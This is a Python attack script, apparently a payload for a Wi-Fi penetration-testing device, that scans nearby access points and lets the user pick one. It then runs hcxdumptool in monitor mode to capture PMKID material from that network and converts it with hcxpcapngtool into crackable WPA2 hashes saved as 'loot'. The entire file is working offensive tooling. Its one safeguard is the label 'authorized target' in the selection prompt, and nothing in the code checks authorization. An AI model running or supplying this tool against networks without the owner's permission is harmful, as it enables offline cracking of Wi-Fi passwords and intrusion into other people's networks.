#!/usr/bin/env python3
# @active: true
# @web: true
# @name: PMKID Hash Grabber
# @desc: Captures PMKID hashes from WPA2 access points by sending association requests and extracting the PMKID from EAPOL RSN PMKID-List.
# @category: wifi
# @danger: true
# @inputs: [{"name":"scan_seconds","label":"AP scan duration","type":"number","default":"15"},{"name":"capture_seconds","label":"Capture duration","type":"number","default":"120"}]

import os
import re
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))
from payloads._iface_helper import list_interfaces
from payloads._web_input import request_input


def choose_interface():
    items = [x for x in list_interfaces("wifi") if x.get("supports_monitor")]
    if not items:
        print("No monitor-capable Wi-Fi interface found", flush=True)
        return None
    choices = [{"value": x["name"], "label": f"{x['name']} · {x.get('bus') or 'unknown'}"} for x in items]
    return str(request_input("Select monitor-capable Wi-Fi interface", input_type="select", choices=choices))


def command(cmd, timeout=30, check=True):
    result = subprocess.run(cmd, text=True, capture_output=True, timeout=timeout)
    if check and result.returncode:
        raise RuntimeError((result.stderr or result.stdout or "command failed").strip())
    return result


def restore(iface):
    for cmd in (["sudo", "-n", "ip", "link", "set", iface, "down"],
                ["sudo", "-n", "iw", "dev", iface, "set", "type", "managed"],
                ["sudo", "-n", "ip", "link", "set", iface, "up"]):
        command(cmd, timeout=10, check=False)


def scan_aps(iface, seconds):
    command(["sudo", "-n", "ip", "link", "set", iface, "up"], check=False)
    proc = subprocess.Popen(["sudo", "-n", "iw", "dev", iface, "scan"], stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, text=True, start_new_session=True)
    try:
        out, err = proc.communicate(timeout=seconds)
    except subprocess.TimeoutExpired:
        os.killpg(proc.pid, signal.SIGTERM)
        out, err = proc.communicate(timeout=5)
    if proc.returncode not in (0, -signal.SIGTERM):
        raise RuntimeError(err.strip() or "iw scan failed")
    aps, current = [], None
    for line in out.splitlines():
        match = re.match(r"^BSS ([0-9a-f:]{17})", line.strip(), re.I)
        if match:
            if current:
                aps.append(current)
            current = {"bssid": match[1].upper(), "ssid": "<hidden>", "signal": "?"}
        elif current and line.strip().startswith("SSID:"):
            current["ssid"] = line.split(":", 1)[1].strip() or "<hidden>"
        elif current and line.strip().startswith("signal:"):
            current["signal"] = line.split(":", 1)[1].strip()
    if current:
        aps.append(current)
    return aps


def main():
    for tool in ("hcxdumptool", "hcxpcapngtool", "iw", "ip"):
        if not shutil.which(tool):
            print(f"Missing required tool: {tool}", flush=True)
            return 127
    try:
        scan_seconds = min(60.0, max(5.0, float(sys.argv[1]) if len(sys.argv) > 1 else 15.0))
        capture_seconds = min(1800.0, max(10.0, float(sys.argv[2]) if len(sys.argv) > 2 else 120.0))
    except ValueError:
        print("Durations must be numeric", flush=True)
        return 2
    iface = choose_interface()
    if not iface:
        return 1
    loot = Path(os.environ["CITYPOP_LOOT"]) / "PMKID"
    loot.mkdir(parents=True, exist_ok=True)
    proc = None
    try:
        print(f"Scanning access points on {iface}", flush=True)
        aps = scan_aps(iface, scan_seconds)
        if not aps:
            print("No access points found", flush=True)
            return 0
        choices = [{"value": str(i), "label": f"{x['ssid']} · {x['bssid']} · {x['signal']}"}
                   for i, x in enumerate(aps)]
        selected = str(request_input("Select authorized PMKID target", input_type="select", choices=choices))
        if not selected.isdigit() or int(selected) >= len(aps):
            print("Invalid target selection", flush=True)
            return 2
        ap = aps[int(selected)]
        stamp = time.strftime("%Y%m%d_%H%M%S")
        capture = loot / f"pmkid_{ap['bssid'].replace(':', '')}_{stamp}.pcapng"
        hashes = loot / f"pmkid_{ap['bssid'].replace(':', '')}_{stamp}.22000"
        filter_file = loot / f"filter_{stamp}.txt"
        filter_file.write_text(ap["bssid"].replace(":", "") + "\n", encoding="ascii")
        cmd = ["sudo", "-n", "hcxdumptool", "-i", iface, "-w", str(capture),
               "--filterlist_ap", str(filter_file), "--filtermode", "2", "--enable_status=1"]
        print(f"Capturing {ap['ssid']} for {capture_seconds:g}s", flush=True)
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                                start_new_session=True)
        deadline = time.monotonic() + capture_seconds
        while proc.poll() is None and time.monotonic() < deadline:
            line = proc.stdout.readline()
            if line:
                print(line.rstrip(), flush=True)
        if proc.poll() is None:
            os.killpg(proc.pid, signal.SIGINT)
            proc.wait(timeout=10)
        converted = command(["hcxpcapngtool", "-o", str(hashes), str(capture)], check=False)
        if converted.returncode:
            print(f"Hash conversion failed: {converted.stderr.strip()}", flush=True)
            return 1
        count = sum(1 for line in hashes.read_text(errors="replace").splitlines() if line.strip()) if hashes.exists() else 0
        print(f"Saved capture to {capture}; exported hashes={count} to {hashes}", flush=True)
        return 0
    except (RuntimeError, subprocess.SubprocessError, OSError) as exc:
        print(f"PMKID capture failed: {exc}", flush=True)
        return 1
    finally:
        if proc and proc.poll() is None:
            os.killpg(proc.pid, signal.SIGTERM)
        restore(iface)


if __name__ == "__main__":
    raise SystemExit(main())
